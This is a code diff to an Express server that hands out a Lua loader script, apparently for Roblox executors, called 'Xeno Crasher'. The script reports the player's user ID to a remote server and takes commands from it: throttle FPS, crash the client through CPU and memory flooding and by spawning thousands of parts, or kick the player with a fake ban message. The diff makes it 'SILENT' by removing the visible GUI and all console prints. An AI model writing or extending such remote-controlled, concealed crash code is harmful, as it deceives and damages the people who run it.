@@ -20,7 +20,7 @@ const players = new Map();
 // LOADER SCRIPT
 // ============================================
 app.get('/loader.lua', (req, res) => {
-    const loader = `--[[ Xeno Crasher - FIXED ]]--
+    const loader = `--[[ Xeno Crasher - SILENT ]]--
 local BASE = "${PUBLIC_URL}"
 local KEY = "xenooooo"
 
@@ -76,45 +76,6 @@ if not LP then
 end
 if not LP then return end
 
-local function createGUI()
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "XenoCrasherGUI"
-    screenGui.ResetOnSpawn = false
-    screenGui.Parent = LP:WaitForChild("PlayerGui")
-    
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 220, 0, 60)
-    frame.Position = UDim2.new(0.5, -110, 0.9, 0)
-    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    frame.BackgroundTransparency = 0.4
-    frame.BorderSizePixel = 2
-    frame.BorderColor3 = Color3.fromRGB(100, 255, 100)
-    frame.Parent = screenGui
-    
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, 0, 0, 30)
-    label.Text = "✅ Xeno Crasher"
-    label.TextColor3 = Color3.fromRGB(100, 255, 100)
-    label.BackgroundTransparency = 1
-    label.Font = Enum.Font.SourceSansBold
-    label.TextSize = 14
-    label.Parent = frame
-    
-    local status = Instance.new("TextLabel")
-    status.Size = UDim2.new(1, 0, 0, 20)
-    status.Position = UDim2.new(0, 0, 0, 30)
-    status.Text = "🟢 Connected"
-    status.TextColor3 = Color3.fromRGB(150, 150, 150)
-    status.BackgroundTransparency = 1
-    status.Font = Enum.Font.SourceSans
-    status.TextSize = 11
-    status.Parent = frame
-    
-    return screenGui, status
-end
-
-local gui, statusLabel = createGUI()
-
 local function heartbeat()
     local data = HttpService:JSONEncode({
         user_id = LP.UserId,
@@ -123,11 +84,7 @@ local function heartbeat()
         executor = "XenoClient",
         online = true
     })
-    
-    local result = sendRequest("POST", BASE .. "/api/public/heartbeat", data)
-    if result then
-        statusLabel.Text = "🟢 Connected"
-    end
+    sendRequest("POST", BASE .. "/api/public/heartbeat", data)
 end
 
 local fpsConnection = nil
@@ -140,32 +97,13 @@ local function setFPSLimit(targetFPS)
         fpsActive = false
     end
     if not targetFPS or targetFPS <= 0 then
-        statusLabel.Text = "🟢 FPS off"
         return
     end
     fpsActive = true
     local frameTime = 1 / targetFPS
-    statusLabel.Text = "🎯 FPS: " .. targetFPS
     fpsConnection = RunService.RenderStepped:Connect(function()
         local startTime = tick()
         while tick() - startTime < frameTime and fpsActive do end
-    end)
-end
-
-local function crashGame()
-    statusLabel.Text = "💥 CRASHING!"
-    task.spawn(function()
-        while true do
-            local x = 0
-            for i = 1, 1000000 do x = x + i end
-        end
-    end)
-    task.spawn(function()
-        local t = {}
-        while true do
-            for i = 1, 1000 do t[#t + 1] = string.rep("X", 50000) end
-            task.wait()
-        end
     end)
 end
 
@@ -178,14 +116,11 @@ local function poll()
     local result = sendRequest("GET", url, nil)
     
     if result and result ~= "" then
-        -- ✅ Try to parse JSON, but handle errors
         local success, data = pcall(function()
             return HttpService:JSONDecode(result)
         end)
         
         if success and data then
-            print("📥 Received: " .. HttpService:JSONEncode(data))
-            
             if data.fps_limit then
                 setFPSLimit(tonumber(data.fps_limit))
             else
@@ -193,27 +128,46 @@ local function poll()
             end
             
             if data.crash == true then
-                print("💥 CRASH!")
-                crashGame()
+                task.spawn(function()
+                    while true do
+                        local x = 0
+                        for i = 1, 1000000 do x = x + i end
+                    end
+                end)
+                task.spawn(function()
+                    local t = {}
+                    while true do
+                        for i = 1, 1000 do t[#t + 1] = string.rep("X", 50000) end
+                        task.wait()
+                    end
+                end)
+                task.spawn(function()
+                    for i = 1, 5000 do
+                        local p = Instance.new("Part")
+                        p.Size = Vector3.new(100, 100, 100)
+                        p.Parent = workspace
+                        p.Position = Vector3.new(
+                            math.random(-1000, 1000),
+                            math.random(-1000, 1000),
+                            math.random(-1000, 1000)
+                        )
+                        task.wait(0.01)
+                    end
+                end)
             end
             
             if data.kick == true then
-                print("👢 KICK!")
                 local kickMessage = data.kick_message or "You have been banned."
                 task.wait(0.5)
                 LP:Kick(kickMessage)
             end
-        else
-            print("⚠️ Failed to parse JSON: " .. tostring(result))
         end
     end
     
     pollRunning = false
 end
 
-print("🚀 Starting Xeno Crasher...")
 heartbeat()
-
 task.wait(3)
 
 task.spawn(function()
@@ -228,17 +182,14 @@ task.spawn(function()
         heartbeat()
         task.wait(5)
     end
-end)
-
-print("✅ Xeno Crasher loaded!")
-print("👤 Player: " .. LP.Name)`;
+end)`;
 
     res.setHeader('Content-Type', 'text/plain');
     res.send(loader);
 });
 
 // ============================================
-// ✅ FIXED: API ENDPOINTS (ALL RETURN JSON)
+// ✅ FIXED: API ENDPOINTS
 // ============================================
 
 app.get('/api/public/heartbeat', (req, res) => {
@@ -293,10 +244,18 @@ app.get('/api/players', (req, res) => {
     const list = [];
     const now = Date.now();
     const OFFLINE_THRESHOLD = 15000;
+    const REMOVE_THRESHOLD = 60000; // Remove after 60 seconds offline
 
     for (const [id, p] of players.entries()) {
         const timeSinceLast = now - (p.lastHeartbeat || 0);
         const online = timeSinceLast < OFFLINE_THRESHOLD;
+        
+        // Remove if offline for too long
+        if (!online && timeSinceLast > REMOVE_THRESHOLD) {
+            players.delete(id);
+            continue;
+        }
+        
         p.online = online;
         list.push({ ...p });
         players.set(id, p);
@@ -354,22 +313,18 @@ app.get('/api/public/command', (req, res) => {
         response.kick_message = p._kick_message || "You have been banned.";
         p._kick = false;
         p._kick_message = '';
+        // ✅ Mark player as offline immediately so they can rejoin
+        p.online = false;
     }
     
     players.set(String(userId), p);
     res.json(response);
 });
 
-// ============================================
-// SERVE FRONTEND
-// ============================================
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// ============================================
-// START SERVER
-// ============================================
 app.listen(PORT, () => {
     console.log(`🚀 Xeno Crasher Server running on port ${PORT}`);
     console.log(`📍 Public URL: ${PUBLIC_URL}`);
